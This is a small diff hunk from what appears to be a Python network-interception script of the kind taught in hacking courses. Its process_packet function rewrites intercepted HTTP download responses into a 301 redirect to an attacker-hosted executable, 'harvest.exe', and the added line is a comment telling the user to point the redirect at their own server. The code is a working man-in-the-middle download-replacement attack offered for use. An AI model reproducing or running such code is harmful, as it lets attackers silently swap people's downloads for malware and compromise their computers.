@@ -27,6 +27,7 @@ def process_packet(packet):
                 print("[+] Replacing download file...")
                 modified_packet = set_load(my_packet, "HTTP/1.1 301 Moved Permanently\nLocation: "
                                                       "https://192.168.x.y/havesters/harvest.exe\n ")
+                #  replace the destination link/location with your own(could point to a file in your own pc's server)
 
                 packet.set_payload(bytes(modified_packet))
 
